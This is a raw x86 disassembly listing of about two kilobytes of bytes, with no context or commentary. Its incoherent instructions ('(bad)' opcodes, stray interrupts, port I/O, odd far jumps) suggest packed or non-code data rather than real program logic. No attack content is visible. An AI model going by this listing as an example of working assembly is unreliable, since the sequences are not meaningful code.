  422ac6:	xchg   edx,eax
  422ac7:	add    BYTE PTR [eax+0x649c5bd6],0x8b
  422ace:	ror    BYTE PTR [ecx+0x53d09282],1
  422ad4:	jo     0x422aa3
  422ad6:	(bad)  
  422ad7:	std    
  422ad8:	xor    edx,esi
  422ada:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422adb:	inc    ebx
  422adc:	(bad)  
  422add:	xor    al,0x2f
  422adf:	or     esp,ebx
  422ae1:	add    DWORD PTR [eax-0x1932ba80],0xceeb41fd
  422aeb:	add    DWORD PTR [eax-0x42622f80],0x808081fa
  422af5:	int    0xd6
  422af7:	popf   
  422af8:	aam    0x23
  422afa:	shl    BYTE PTR [ebp-0x7f7e1143],1
  422b00:	or     ch,0xd6
  422b03:	xchg   ebp,eax
  422b04:	aam    0x89
  422b06:	int    0xd6
  422b08:	icebp  
  422b09:	int    0x8d
  422b0b:	xchg   ebp,eax
  422b0c:	or     cl,BYTE PTR [ebp-0x6272320f]
  422b12:	or     cl,BYTE PTR [ebp-0x5a72326b]
  422b18:	or     cl,BYTE PTR [ebp-0x5a29f563]
  422b1e:	pushf  
  422b1f:	stos   BYTE PTR es:[edi],al
  422b20:	sahf   
  422b21:	popa   
  422b22:	mov    esp,0xc180804a
  422b27:	mov    BYTE PTR [edi+0x649a62d9],al
  422b2d:	mov    ecx,edx
  422b2f:	rol    DWORD PTR [edx+0x70878492],cl
  422b35:	int    0xc6
  422b37:	or     eax,0x808169bd
  422b3c:	adc    dh,0x14
  422b3f:	int    0x76
  422b41:	mov    ebp,0xd30de6cd
  422b46:	lods   eax,DWORD PTR ds:[esi]
  422b47:	xchg   DWORD PTR [ebx],esi
  422b49:	retf   
  422b4a:	ror    BYTE PTR [eax+0x7ae4cfa8],0x84
  422b51:	in     al,dx
  422b52:	push   esi
  422b53:	int    0xc6
  422b55:	or     eax,0xbd92c704
  422b5a:	daa    
  422b5b:	add    DWORD PTR [eax-0x32e32980],0xe6cdbd76
  422b65:	or     eax,0xc087add3
  422b6a:	mov    BYTE PTR [esi-0x30577740],bl
  422b70:	gs jp  0x422af7
  422b73:	add    DWORD PTR [eax-0x3ccf1380],0x80809284
  422b7d:	xchg   esi,esp
  422b7f:	or     eax,0x699e30c0
  422b84:	add    BYTE PTR [ecx-0x72f57f80],0xb5
  422b8b:	xor    ebp,DWORD PTR [ebp+0x6c]
  422b8e:	int    0x10
  422b90:	mov    ebp,0x808081bc
  422b95:	int    0x7d
  422b97:	xor    ecx,DWORD PTR [edi]
  422b99:	xor    ah,0x81
  422b9c:	lea    esi,[ebp-0x7b8a19fc]
  422ba2:	das    
  422ba3:	add    al,0xd0
  422ba5:	add    BYTE PTR [eax+0x75760480],0x8b
  422bac:	int    0x8d
  422bae:	mov    ch,0x4
  422bb0:	cli    
  422bb1:	test   BYTE PTR [edx-0x61783f79],al
  422bb7:	int    0xe6
  422bb9:	jge    0x422b8e
  422bbb:	xacquire xchg BYTE PTR [ebx],dh
  422bbe:	ins    DWORD PTR es:[edi],dx
  422bbf:	ins    BYTE PTR es:[edi],dx
  422bc0:	shr    BYTE PTR [eax+ebp*4-0x31],0x65
  422bc5:	outs   dx,DWORD PTR ds:[esi]
  422bc6:	lods   al,BYTE PTR ds:[esi]
  422bc7:	xchg   DWORD PTR [eax-0x42ef3280],eax
  422bcd:	inc    esp
  422bce:	add    DWORD PTR [eax+0x337dcd80],0xaf4820f
  422bd8:	lea    edi,[ebp+0x4a58d0a]
  422bde:	cli    
  422bdf:	test   BYTE PTR [edx+0x402cd77],al
  422be5:	mov    dh,0xa5
  422be7:	and    ebx,0xa58d04ef
  422bed:	xchg   edx,eax
  422bee:	mov    es,WORD PTR [edx+edi*8]
  422bf1:	dec    esi
  422bf2:	ja     0x422c12
  422bf4:	pop    ebp
  422bf5:	rcl    DWORD PTR [edx-0x2ccc7f80],1
  422bfb:	int    0xf
  422bfd:	fidiv  DWORD PTR [esi-0x5a89785b]
  422c03:	jecxz  0x422bb2
  422c05:	xchg   DWORD PTR [esi+0x7d],esi
  422c08:	or     dh,BYTE PTR [esi+0xd]
  422c0b:	in     al,dx
  422c0c:	inc    esi
  422c0d:	add    al,0xef
  422c0f:	test   BYTE PTR [ebp-0x7f7f7fc9],bh
  422c15:	jecxz  0x422c03
  422c17:	jecxz  0x422bcf
  422c19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c1a:	pop    esi
  422c1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c1c:	lods   eax,DWORD PTR ds:[esi]
  422c1d:	add    BYTE PTR [esi+0x3ea57600],0xa6
  422c24:	lods   eax,DWORD PTR ds:[esi]
  422c25:	mov    ss,esi
  422c27:	mov    ebp,0x8086745d
  422c2c:	add    BYTE PTR [edi+0x760a7d76],0xd
  422c33:	shl    DWORD PTR [esi-0x7b3f7b5b],cl
  422c39:	test   al,0x33
  422c3b:	add    BYTE PTR [edx-0x33],bh
  422c3e:	leave  
  422c3f:	int    0xc6
  422c41:	or     eax,0x808059bd
  422c46:	cmp    BYTE PTR ds:0x8987d481,0xe6
  422c4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c4e:	jecxz  0x422c39
  422c50:	mov    ss,esi
  422c52:	in     eax,dx
  422c53:	in     al,dx
  422c54:	add    BYTE PTR [eax],0x76
  422c57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c58:	int    0x8d
  422c5a:	mov    ch,0x4
  422c5c:	rcl    DWORD PTR [edx-0x32021933],cl
  422c62:	leave  
  422c63:	xor    esi,DWORD PTR [esi+0x34]
  422c66:	pop    esi
  422c67:	jbe    0x422c0e
  422c69:	jnp    0x422bf5
  422c6b:	int    0xf8
  422c6d:	xor    edx,esi
  422c6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c70:	int    0x96
  422c72:	cmp    al,0x45
  422c74:	inc    ecx
  422c75:	inc    ebx
  422c76:	add    esi,DWORD PTR [edi-0x79]
  422c79:	jle    0x422c51
  422c7b:	clc    
  422c7c:	or     ah,dh
  422c7e:	std    
  422c7f:	das    
  422c80:	pop    ecx
  422c81:	adc    DWORD PTR [ebx-0x1a],eax
  422c84:	cmp    al,0x2f
  422c86:	or     esp,DWORD PTR [edx-0x2]
  422c89:	add    BYTE PTR [eax],al
  422c8b:	mov    ebp,0x80808040
  422c90:	xor    ebp,DWORD PTR [ebp-0x31]
  422c93:	les    esi,FWORD PTR [esp+eiz*2]
  422c96:	int    0x96
  422c98:	sub    al,0xcd
  422c9a:	(bad)  
  422c9b:	stc    
  422c9c:	xor    edx,esi
  422c9e:	sbb    al,0xa
  422ca0:	inc    edx
  422ca1:	int    0x96
  422ca3:	inc    esp
  422ca4:	int    0xe6
  422ca6:	std    
  422ca7:	xor    esp,esi
  422ca9:	xor    al,0xa
  422cab:	pusha  
  422cac:	retf   
  422cad:	arpl   WORD PTR [eax-0x7fdb2d56],bp
  422cb3:	test   al,0x9c
  422cb5:	xor    ebp,DWORD PTR [ebp+0x6c]
  422cb8:	in     al,dx
  422cb9:	popf   
  422cba:	adc    bh,ah
  422cbc:	add    BYTE PTR [eax-0x7e7d7e80],0xc5
  422cc3:	shl    ebp,cl
  422cc5:	mov    BYTE PTR [eax+0x43f9d6cd],bl
  422ccb:	(bad)  
  422ccc:	and    al,0x77
  422cce:	mov    ch,0xcd
  422cd0:	jbe    0x422c7f
  422cd2:	shr    DWORD PTR [ebp+0x760a4588],cl
  422cd8:	lods   eax,DWORD PTR ds:[esi]
  422cd9:	or     dl,dh
  422cdb:	stc    
  422cdc:	test   al,0xc5
  422cde:	int    0x8d
  422ce0:	jne    0x422d11
  422ce2:	pop    ecx
  422ce3:	ins    DWORD PTR es:[edi],dx
  422ce4:	shl    edx,cl
  422ce6:	test   BYTE PTR [edi-0x2c78428a],al
  422cec:	in     al,dx
  422ced:	xchg   BYTE PTR [edi],ch
  422cef:	pop    ecx
  422cf0:	ins    DWORD PTR es:[edi],dx
  422cf1:	xchg   DWORD PTR [esi+0x75],esi
  422cf4:	int    0xc6
  422cf6:	jge    0x422cc7
  422cf8:	les    esi,FWORD PTR [esi-0x80]
  422cfb:	xor    ebp,DWORD PTR [ebp-0x31]
  422cfe:	les    esi,FWORD PTR [esi-0x80]
  422d01:	adc    bh,ah
  422d03:	add    BYTE PTR [eax+0x24778180],0xcd
  422d0a:	mov    WORD PTR [esp+ebx*2],?
  422d0d:	shl    DWORD PTR [esp+esi*1-0x73bc77d4],cl
  422d14:	xor    al,0xa4
  422d16:	ja     0x422d3d
  422d18:	retf   0x31
  422d1b:	je     0x422d51
  422d1d:	pop    esp
  422d1e:	shl    ebp,cl
  422d20:	mov    BYTE PTR [ecx],cl
  422d22:	xchg   esp,eax
  422d23:	xor    al,0x2c
  422d25:	int    0xc
  422d27:	das    
  422d28:	mov    ebx,0xebd38096
  422d2d:	push   ebx
  422d2e:	das    
  422d2f:	rcl    DWORD PTR [ebx],1
  422d31:	pop    esi
  422d32:	mov    WORD PTR [esp+ebp*1],?
  422d35:	ja     0x422d51
  422d37:	int    0xdb
  422d39:	pop    edi
  422d3a:	or     BYTE PTR [eax+0x13338080],0xd3
  422d41:	jmp    0x422cc8
  422d43:	mov    eax,0x87808d81
  422d48:	ins    DWORD PTR es:[edi],dx
  422d49:	iret   
  422d4a:	les    esi,FWORD PTR [esp+ebp*2]
  422d4d:	(bad)
  422d50:	test   DWORD PTR [esi],edi
  422d52:	mov    WORD PTR [esp+ebp*1],?
  422d55:	xor    ebx,ebx
  422d57:	mov    eax,0x8780963e
  422d5c:	ins    DWORD PTR es:[edi],dx
  422d5d:	add    al,0x6d
  422d5f:	or     edi,0xc56c34c4
  422d65:	cwde   
  422d66:	int    0xf0
  422d68:	mov    ebp,0xfcd9
  422d6d:	int    0xd9
  422d6f:	int    0xf
  422d71:	jns    0x422cf9
  422d73:	mov    bh,0xbd
  422d75:	sub    esp,edi
  422d77:	add    BYTE PTR [eax],al
  422d79:	cwde   
  422d7a:	int    0xf0
  422d7c:	jns    0x422df6
  422d7e:	test   DWORD PTR [ebx+0xfc6bbd],esp
  422d84:	add    BYTE PTR [eax-0x58798787],bl
  422d8a:	mov    ebp,0xfc38
  422d8f:	jns    0x422e09
  422d91:	xchg   edx,eax
  422d92:	cmp    eax,0xeceb99cd
  422d97:	add    eax,DWORD PTR [eax]
  422d99:	add    BYTE PTR [esi-0x12ed1233],dl
  422d9f:	inc    esp
  422da0:	add    DWORD PTR [eax-0x6893680],0x35862149
  422daa:	leave  
  422dab:	jbe    0x422d62
  422dad:	inc    ecx
  422dae:	and    DWORD PTR [esi-0x778932cb],eax
  422db4:	or     dh,BYTE PTR [esi-0x78]
  422db7:	int    0x76
  422db9:	stc    
  422dba:	int    0x96
  422dbc:	stc    
  422dbd:	pop    ebx
  422dbe:	cwde   
  422dbf:	call   0xd3e3:0x3b9effc0
  422dc6:	jmp    0x3586:0x21d1bf28
  422dcd:	cmp    eax,ebp
  422dcf:	sar    DWORD PTR [ebp+0xad25392],cl
  422dd5:	jbe    0x422e4c
  422dd7:	int    0x76
  422dd9:	stc    
  422dda:	int    0x96
  422ddc:	stc    
  422ddd:	cmp    eax,ebp
  422ddf:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422de5:	jmp    0xfd76:0xad25328
  422dec:	int    0x76
  422dee:	stc    
  422def:	int    0x96
  422df1:	stc    
  422df2:	cmp    eax,ebp
  422df4:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422dfa:	jmp    0xd076:0xad25328
  422e01:	int    0x76
  422e03:	stc    
  422e04:	int    0x96
  422e06:	stc    
  422e07:	cmp    eax,ebp
  422e09:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e0f:	jmp    0xbd76:0xad25328
  422e16:	leave  
  422e17:	jbe    0x422e46
  422e19:	dec    ecx
  422e1a:	and    DWORD PTR [ebp+esi*1+0x496576c9],eax
  422e21:	mov    al,ds:0x76c93586
  422e26:	and    eax,0x35862169
  422e2b:	sar    BYTE PTR [esp+ebx*4],0xa
  422e2f:	jbe    0x422e01
  422e31:	or     dh,BYTE PTR [esi-0x30]
  422e34:	sar    BYTE PTR [esp+ebx*4+0xad0760a],0x76
  422e3c:	ror    cl,1
  422e3e:	jbe    0x422e10
  422e40:	jo     0x422dc2
  422e42:	add    BYTE PTR [eax+0x78d076c9],0x80
  422e49:	add    BYTE PTR [eax-0x32068933],0x96
  422e50:	stc    
  422e51:	cmp    eax,ebp
  422e53:	cmp    esp,ebx
  422e55:	sar    DWORD PTR [ebp+0x28ead392],cl
  422e5b:	push   ebx
  422e5c:	ror    BYTE PTR [edx],cl
  422e5e:	jbe    0x422e30
  422e60:	int    0x76
  422e62:	stc    
  422e63:	int    0x96
  422e65:	stc    
  422e66:	cmp    eax,ebp
  422e68:	cmp    esp,ebx
  422e6a:	sar    DWORD PTR [ebp+0x28ead392],cl
  422e70:	push   ebx
  422e71:	ror    BYTE PTR [edx],cl
  422e73:	jbe    0x422e45
  422e75:	leave  
  422e76:	jbe    0x422e0d
  422e78:	arpl   WORD PTR [edx+0x76c98080],dx
  422e7e:	lods   eax,DWORD PTR ds:[esi]
  422e7f:	pop    esi
  422e80:	add    BYTE PTR [eax+0xd76c980],0xe6
  422e87:	add    BYTE PTR [eax-0xa983080],0xff
  422e8e:	add    BYTE PTR [eax],al
  422e90:	iret   
  422e91:	push   edi
  422e92:	xchg   ebp,eax
  422e93:	inc    DWORD PTR [eax]
  422e95:	add    BYTE PTR [ebp+0xff13],bh
  422e9b:	add    BYTE PTR [ebp+0xf3d60d],cl
  422ea1:	lea    ebp,[ebp-0x72ff562a]
  422ea7:	xchg   ebp,eax
  422ea8:	(bad)  
  422ea9:	fcmove st,st(1)
  422eab:	jbe    0x422e5a
  422ead:	dec    esi
  422eae:	ins    BYTE PTR es:[edi],dx
  422eaf:	add    BYTE PTR [eax-0x32068933],0x8d
  422eb6:	stc    
  422eb7:	cmp    eax,ebp
  422eb9:	sar    DWORD PTR [ebp-0x57003f6e],cl
  422ebf:	cmp    ecx,DWORD PTR [edi]
  422ec1:	shl    edx,cl
  422ec3:	sub    BYTE PTR [ebx-0x2d],dl
  422ec6:	or     dh,BYTE PTR [esi+0x6d]
  422ec9:	int    0x76
  422ecb:	stc    
  422ecc:	int    0x8d
  422ece:	stc    
  422ecf:	add    al,0xb6
  422ed1:	cmc    
  422ed2:	cmp    BYTE PTR [ebx],0xc5
  422ed5:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  422edb:	repnz sub BYTE PTR [ebx-0x2d],dl
  422edf:	or     dh,BYTE PTR [esi-0x6b]
  422ee2:	mov    ah,0xb1
  422ee4:	sbb    al,0x80
  422ee6:	add    BYTE PTR [eax-0x320a89f6],0x6c
  422eed:	push   eax
  422eee:	or     dh,BYTE PTR [esi-0x13]
  422ef1:	int    0x6c
  422ef3:	dec    esp
  422ef4:	or     dh,BYTE PTR [esi+0x11]
  422ef7:	int    0x76
  422ef9:	mov    bh,cl
  422efb:	(bad)  
  422efc:	cmc    
  422efd:	or     cl,BYTE PTR [ecx]
  422eff:	rol    BYTE PTR [ecx+0x76cd8080],1
  422f05:	mov    bh,cl
  422f07:	(bad)  
  422f08:	in     eax,dx
  422f09:	or     cl,BYTE PTR [ecx]
  422f0b:	push   ebp
  422f0c:	add    DWORD PTR [eax-0x77893280],0xcf88d600
  422f16:	lea    edx,[ecx]
  422f18:	or     cl,BYTE PTR [ecx]
  422f1a:	pop    ebp
  422f1b:	add    DWORD PTR [eax+0x3eccbd80],0x8dcd8080
  422f25:	stc    
  422f26:	int    0x96
  422f28:	stc    
  422f29:	cmp    ecx,DWORD PTR [ebx+edi*1]
  422f2c:	cdq    
  422f2d:	shr    ebx,cl
  422f2f:	xchg   edx,eax
  422f30:	shr    edx,cl
  422f32:	sub    BYTE PTR [ebx+0x13],dl
  422f35:	inc    ebx
  422f36:	jge    0x422f67
  422f38:	add    eax,0x808087ca
  422f3d:	int    0x76
  422f3f:	mov    ch,cl
  422f41:	add    DWORD PTR ds:0xcd808081,esi
  422f47:	mov    ch,cl
  422f49:	jbe    0x422ed3
  422f4b:	int    0x1
  422f4d:	xor    eax,0xcd808081
  422f52:	add    BYTE PTR [edi-0x72329b92],0x88
  422f59:	int    0xa
  422f5b:	adc    DWORD PTR [ecx+0x17cf8080],eax
  422f61:	adc    al,0x0
  422f63:	add    BYTE PTR [eax],al
  422f65:	(bad)  
  422f66:	int    0x96
  422f68:	mov    ch,cl
  422f6a:	mov    ds:0x80808125,al
  422f6f:	int    0x22
  422f71:	xchg   DWORD PTR [eax-0x7f7f7ff7],esi
  422f77:	rol    BYTE PTR [eax+eax*1-0x7f7f3330],0x80
  422f7f:	bound  eax,QWORD PTR [eax]
  422f81:	jno    0x422fa7
  422f83:	cmp    ebp,DWORD PTR [ebp-0x37]
  422f86:	push   es
  422f87:	push   esp
  422f88:	add    BYTE PTR [eax],al
  422f8a:	add    BYTE PTR [esi],cl
  422f8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f8d:	aad    0x49
  422f8f:	leave  
  422f90:	push   es
  422f91:	pop    esp
  422f92:	add    BYTE PTR [eax],al
  422f94:	add    BYTE PTR [edi+0x35],dl
  422f97:	adc    ebp,DWORD PTR [ebx+0x6406c9]
  422f9d:	add    BYTE PTR [eax],al
  422f9f:	mov    ds:0x79d735c1,eax
  422fa4:	push   es
  422fa5:	ins    BYTE PTR es:[edi],dx
  422fa6:	add    BYTE PTR [eax],al
  422fa8:	add    BYTE PTR [eax],bl
  422faa:	iret   
  422fab:	outs   dx,BYTE PTR ds:[si]
  422fad:	add    BYTE PTR [eax],al
  422faf:	add    BYTE PTR [edi+0x3b41afb8],ch
  422fb5:	ins    DWORD PTR es:[edi],dx
  422fb6:	leave  
  422fb7:	push   es
  422fb8:	sub    al,0x0
  422fba:	add    BYTE PTR [eax],al
  422fbc:	push   cs
  422fbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fbe:	aad    0x49
  422fc0:	leave  
  422fc1:	push   es
  422fc2:	xor    al,0x0
  422fc4:	add    BYTE PTR [eax],al
  422fc6:	push   edi
  422fc7:	xor    eax,0x6c9ab13
  422fcc:	cmp    al,0x0
  422fce:	add    BYTE PTR [eax],al
  422fd0:	mov    ds:0x79c335c1,eax
  422fd5:	push   es
  422fd6:	inc    esp
  422fd7:	add    BYTE PTR [eax],al
  422fd9:	add    BYTE PTR [eax],bl
  422fdb:	iret   
  422fdc:	addr16 inc esi
  422fde:	add    BYTE PTR [eax],al
  422fe0:	add    BYTE PTR [edi-0x32be5048],ch
  422fe6:	jbe    0x422f70
  422fe8:	int    0x1
  422fea:	adc    DWORD PTR [ecx-0x19327f80],eax
  422ff0:	mov    BYTE PTR [ebp*2+0x35760a30],al
  422ff7:	int    0x76
  422ff9:	mov    ch,cl
  422ffb:	add    DWORD PTR [ebp-0x7f],edi
  422ffe:	add    BYTE PTR [eax+0x410176c9],0xa7
  423005:	mov    dl,0x35
  423007:	leave  
  423008:	jbe    0x42300f
  42300a:	mov    bh,0x3f
  42300c:	cmp    DWORD PTR [edi-0x48],eax
  42300f:	leave  
  423010:	jbe    0x42301b
  423012:	xlat   BYTE PTR ds:[ebx]
  423013:	sbb    cl,cl
  423015:	push   es
  423016:	les    eax,FWORD PTR [eax]
  423018:	add    BYTE PTR [eax],al
  42301a:	push   cs
  42301b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42301c:	aad    0x49
  42301e:	leave  
  42301f:	push   es
  423020:	nop
  423021:	add    BYTE PTR [eax],al
  423023:	add    BYTE PTR [edi+0x35],dl
  423026:	xlat   BYTE PTR ds:[ebx]
  423027:	inc    ecx
  423028:	leave  
  423029:	push   es
  42302a:	aam    0x0
  42302c:	add    BYTE PTR [eax],al
  42302e:	cmp    DWORD PTR [ecx+0x57],ecx
  423031:	jge    0x422ffc
  423033:	push   es
  423034:	fadd   QWORD PTR [eax]
  423036:	add    BYTE PTR [eax],al
  423038:	mov    cl,0x3f
  42303a:	shl    DWORD PTR ds:0xe406c9,0x0
  423041:	add    BYTE PTR [edi-0x49],al
  423044:	xlat   BYTE PTR ds:[ebx]
  423045:	sbb    cl,cl
  423047:	push   es
  423048:	pushf  
  423049:	add    BYTE PTR [eax],al
  42304b:	add    BYTE PTR [esi],cl
  42304d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42304e:	aad    0x49
  423050:	leave  
  423051:	push   es
  423052:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423053:	add    BYTE PTR [eax],al
  423055:	add    BYTE PTR [edi+0x35],dl
  423058:	xlat   BYTE PTR ds:[ebx]
  423059:	inc    ecx
  42305a:	leave  
  42305b:	push   es
  42305c:	lods   al,BYTE PTR ds:[esi]
  42305d:	add    BYTE PTR [eax],al
  42305f:	add    BYTE PTR [ecx],bh
  423061:	dec    ecx
  423062:	push   edi
  423063:	jge    0x42302e
  423065:	push   es
  423066:	mov    ah,0x0
  423068:	add    BYTE PTR [eax],al
  42306a:	mov    cl,0x3f
  42306c:	shl    DWORD PTR ds:0xbc06c9,0x0
  423073:	add    BYTE PTR [edi-0x49],al
  423076:	ret    
  423077:	sbb    BYTE PTR [ebp-0x7f7fc39d],bh
  42307d:	jo     0x42304c
  42307f:	jbe    0x4230b6
  423081:	add    BYTE PTR [eax],dh
  423083:	int    0x76
  423085:	stc    
  423086:	int    0x8d
  423088:	stc    
  423089:	cmp    eax,ebp
  42308b:	cmp    ecx,DWORD PTR [edi]
  42308d:	shl    edx,cl
  42308f:	sub    bl,dl
  423091:	mov    ebp,0xcdd35392
  423096:	lea    ebp,[ebp+0x52fd343]
  42309c:	test   BYTE PTR [ecx+0x76cd8080],0xb5
  4230a3:	int    0x8d
  4230a5:	mov    ch,0x3b
  4230a7:	lds    edi,FWORD PTR [ebx]
  4230a9:	psrlq  mm6,mm2
  4230ac:	sub    bl,dl
  4230ae:	mov    ebp,0xcdd35392
  4230b3:	lea    ebp,[ebp+0x76cd7d33]
  4230b9:	ins    DWORD PTR es:[edi],dx
  4230ba:	inc    ebx
  4230bb:	shr    DWORD PTR [edi],cl
  4230bd:	or     ch,dl
  4230bf:	add    DWORD PTR [eax+0x3d76c980],0x80808080
  4230c9:	int    0x76
  4230cb:	mov    ch,cl
  4230cd:	rcl    BYTE PTR [ecx],1
  4230cf:	add    DWORD PTR [eax-0x77193280],0xcd8876cd
  4230d9:	add    DWORD PTR [ebp-0x7f],esi
  4230dc:	add    BYTE PTR [eax-0x7fc50943],0x80
  4230e3:	jo     0x4230e5
  4230e5:	cwde   
  4230e6:	xor    ch,cl
  4230e8:	lea    ecx,[eax-0x7ebaf533]
  4230ee:	add    BYTE PTR [eax+0x76cd810a],0x88
  4230f5:	int    0x5d
  4230f7:	adc    DWORD PTR [ecx-0x29327f80],eax
  4230fd:	mov    BYTE PTR [ebx],bh
  4230ff:	ins    DWORD PTR es:[edi],dx
  423100:	iret   
  423101:	pop    ss
  423102:	pushf  
  423103:	add    BYTE PTR [eax],al
  423105:	add    BYTE PTR [ebp-0x7f7fc36e],bh
  42310b:	jo     0x4230da
  42310d:	jbe    0x423097
  42310f:	int    0x1
  423111:	inc    ebp
  423112:	add    DWORD PTR [eax+0x500080],0x760a889a
  42311c:	adc    eax,0xcd8876cd
  423121:	pop    ebp
  423122:	adc    DWORD PTR [ecx-0x29327f80],eax
  423128:	mov    BYTE PTR [ebx],bh
  42312a:	ins    DWORD PTR es:[edi],dx
  42312b:	iret   
  42312c:	pop    ss
  42312d:	les    eax,FWORD PTR [eax]
  42312f:	add    BYTE PTR [eax],al
  423131:	mov    ebp,0x80803ad9
  423136:	jo     0x423105
  423138:	jbe    0x4230c2
  42313a:	int    0x1
  42313c:	inc    ebp
  42313d:	add    DWORD PTR [eax+0x500080],0x76cd889a
  423147:	mov    ch,cl
  423149:	pop    ebp
  42314a:	adc    DWORD PTR [ecx-0x29327f80],eax
  423150:	mov    BYTE PTR [ebx],bh
  423152:	ins    DWORD PTR es:[edi],dx
  423153:	iret   
  423154:	pop    ss
  423155:	push   esp
  423156:	add    BYTE PTR [eax],al
  423158:	add    BYTE PTR [ebp-0x7f7fc52f],bh
  42315e:	jo     0x42312d
  423160:	jbe    0x4230ea
  423162:	int    0x1
  423164:	inc    ebp
  423165:	add    DWORD PTR [eax+0x500080],0xb604889a
  42316f:	pop    ebp
  423170:	or     BYTE PTR [edx],0x76
  423173:	xor    eax,0xc05d76cd
  423178:	push   ds
  423179:	cmp    ebx,edx
  42317b:	sahf   
  42317c:	clc    
  42317d:	add    al,BYTE PTR [ecx]
  42317f:	shr    BYTE PTR [esi+0x2f],cl
  423182:	pop    ecx
  423183:	shl    BYTE PTR [eax+0x0],cl
  423186:	xchg   esi,eax
  423187:	xor    eax,0x43d66d06
  42318c:	int    0x76
  42318e:	pop    ebp
  42318f:	add    al,0xad
  423191:	mov    eax,DWORD PTR [ebp*2-0x69ff8faf]
  423198:	adc    eax,0x40d46d06
  42319d:	int    0x76
  42319f:	mov    ch,cl
  4231a1:	pop    ebp
  4231a2:	adc    DWORD PTR [ecx-0x29327f80],eax
  4231a8:	mov    BYTE PTR [ebx],bh
  4231aa:	ins    DWORD PTR es:[edi],dx
  4231ab:	iret   
  4231ac:	xchg   esi,eax
  4231ad:	add    DWORD PTR [ebp-0x7f7fc560],edi
  4231b3:	jo     0x423182
  4231b5:	jbe    0x42313f
  4231b7:	int    0x1
  4231b9:	cmp    eax,0x808081
  4231be:	push   eax
  4231bf:	add    BYTE PTR [edx+0xd760a88],bl
  4231c5:	in     al,dx
  4231c6:	test   BYTE PTR [esi+esi*4],al
  4231c9:	or     eax,0x5d760080
  4231ce:	add    al,0xe6
  4231d0:	pop    ebp
  4231d1:	sub    al,0x82
  4231d3:	sub    eax,0xcdb576cd
  4231d8:	lea    esi,[ebp-0x3f772933]
  4231de:	jmp    FWORD PTR [edx-0xfc43ac5]
  4231e4:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4231ea:	push   ebx
  4231eb:	ror    edi,cl
  4231ed:	pop    ss
  4231ee:	cmc    
  4231ef:	inc    DWORD PTR [eax]
  4231f1:	add    BYTE PTR [ebp-0x7f7fc5e8],bh
  4231f7:	jo     0x4231c6
  4231f9:	jbe    0x4231f4
  4231fb:	int    0x8d
  4231fd:	stc    
  4231fe:	int    0xd6
  423200:	mov    BYTE PTR [ebx],bh
  423202:	lds    edi,FWORD PTR [ebx]
  423204:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42320b:	push   ebx
  42320c:	ror    edi,cl
  42320e:	pop    ss
  42320f:	xchg   ebp,eax
  423210:	inc    DWORD PTR [eax]
  423212:	add    BYTE PTR [ebp-0x7f7fc70a],bh
  423218:	jo     0x42321a
  42321a:	xchg   esi,eax
  42321b:	or     eax,0xcdf98dcd
  423220:	xchg   esi,eax
  423221:	stc    
  423222:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423225:	(bad)  
  423227:	jmp    0x4231bb
  423229:	shr    edx,cl
  42322b:	sub    BYTE PTR [ebx+0x13],dl
  42322e:	inc    ebx
  42322f:	jge    0x423207
  423231:	mov    ecx,ecx
  423233:	jbe    0x423272
  423235:	add    DWORD PTR [eax+0x76cd8080],0xb58dcdb5
  42323f:	cmp    eax,ebp
  423241:	sar    DWORD PTR [ebp-0x2c0fc46e],cl
  423247:	repnz sub BYTE PTR [ebx-0x2d],dl
  42324b:	xchg   DWORD PTR [esi+0x6d],esi
  42324e:	or     dh,BYTE PTR [esi+0x6d]
  423251:	int    0x76
  423253:	cmp    eax,0x1cd46d06
  423258:	int    0x76
  42325a:	mov    ch,0xcd
  42325c:	lea    esi,[ebp-0xfc43ac5]
  423262:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423268:	push   ebx
  423269:	rol    DWORD PTR [edi+0x760a9576],cl
  42326f:	xchg   ebp,eax
  423270:	int    0x76
  423272:	mov    ch,0xcd
  423274:	lea    esi,[ebp-0xfc43ac5]
  42327a:	shl    edx,cl
  42327c:	sub    bl,dl
  42327e:	mov    ebp,0xcdd35392
  423283:	lea    ebp,[ebp+0x76cd7d33]
  423289:	ins    DWORD PTR es:[edi],dx
  42328a:	inc    ebx
  42328b:	shr    DWORD PTR [edi],cl
  42328d:	pop    es
  42328e:	push   eax
  42328f:	inc    DWORD PTR [eax]
  423291:	add    al,al
  423293:	jmp    FWORD PTR [eax-0x326a8933]
  423299:	lea    ebp,[ebp+0x43]
  42329c:	jge    0x423274
  42329e:	xor    DWORD PTR [eax],eax
  4232a0:	(bad)  
  4232a1:	mov    bh,cl
  4232a3:	jbe    0x4232a2
  4232a5:	jo     0x423264
  4232a7:	stc    
  4232a8:	jl     0x42322a
  4232aa:	or     BYTE PTR [edx],0x76
  4232ad:	jne    0x42329b
  4232af:	sbb    cl,ch
  4232b1:	jbe    0x423328
  4232b3:	int    0x8d
  4232b5:	mov    ch,0xcd
  4232b7:	xchg   esi,eax
  4232b8:	mov    ch,0x3b
  4232ba:	or     al,0x3b
  4232bc:	cdq    
  4232bd:	shr    ebx,cl
  4232bf:	xchg   edx,eax
  4232c0:	shr    edx,cl
  4232c2:	sub    BYTE PTR [ebx+0x13],dl
  4232c5:	push   ecx
  4232c6:	mov    ch,cl
  4232c8:	jbe    0x4232c3
  4232ca:	int    0x8d
  4232cc:	stc    
  4232cd:	cmp    eax,ebp
  4232cf:	cmp    ecx,DWORD PTR [edi]
  4232d1:	shl    edx,cl
  4232d3:	sub    bl,dl
  4232d5:	mov    ebp,0xcdd35392
  4232da:	lea    esi,[ebp+0x43]
